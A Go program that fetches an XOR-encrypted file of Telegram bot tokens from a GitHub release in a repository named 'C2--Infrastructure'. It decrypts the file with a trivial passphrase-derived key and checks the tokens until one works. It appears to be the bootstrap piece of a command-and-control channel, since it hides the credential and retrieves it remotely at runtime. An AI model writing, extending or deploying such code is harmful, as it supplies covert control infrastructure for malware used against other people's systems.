package main

import (
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// deriveKeyFromPassphrase derives a key of `length` bytes from a passphrase using SHA-256
func deriveKeyFromPassphrase(passphrase string, length int) []byte {
	h := sha256.Sum256([]byte(passphrase))
	key := make([]byte, length)
	copy(key, h[:])

	for i := len(h); i < length; i += len(h) {
		h2 := sha256.Sum256(h[:])
		copy(key[i:], h2[:])
		h = h2
	}
	return key
}

// xorBytes XORs data with key, repeating key bytes, starting from offset
func xorBytes(data []byte, key []byte, offset int) []byte {
	out := make([]byte, len(data))
	keyLen := len(key)
	for i := range data {
		out[i] = data[i] ^ key[(offset+i)%keyLen]
	}
	return out
}

func main() {
	url := "https://github.com/ALLann123/C2--Infrastructure/releases/download/v1.0.0/token.enc"

	resp, err := http.Get(url)
	if err != nil {
		log.Fatalf("Failed to download file: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		log.Fatalf("Bad Status: %s", resp.Status)
	}

	// Read entire encrypted file into memory
	encryptedData, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Failed to read encrypted data: %v", err)
	}

	// Derive key from passphrase "K" (same as Python)
	key := deriveKeyFromPassphrase("K", 32)

	// Decrypt all bytes with key
	decryptedData := xorBytes(encryptedData, key, 0)

	// Convert decrypted bytes to string and split into lines
	decryptedStr := string(decryptedData)
	decryptedStr = strings.ReplaceAll(decryptedStr, "\r\n", "\n")
	lines := strings.Split(decryptedStr, "\n")

	for _, token := range lines {
		token = strings.TrimSpace(token)
		if token == "" {
			continue
		}

		fmt.Printf("Testing token: %s\n", token)

		bot, err := tgbotapi.NewBotAPI(token)
		if err != nil {
			fmt.Printf("Invalid token: %s\nError: %v\n\n", token, err)
			continue
		}

		fmt.Printf("VALID TOKEN: %s\nBotname: @%s\n\n", token, bot.Self.UserName)
		break // stop after first valid token
	}
}
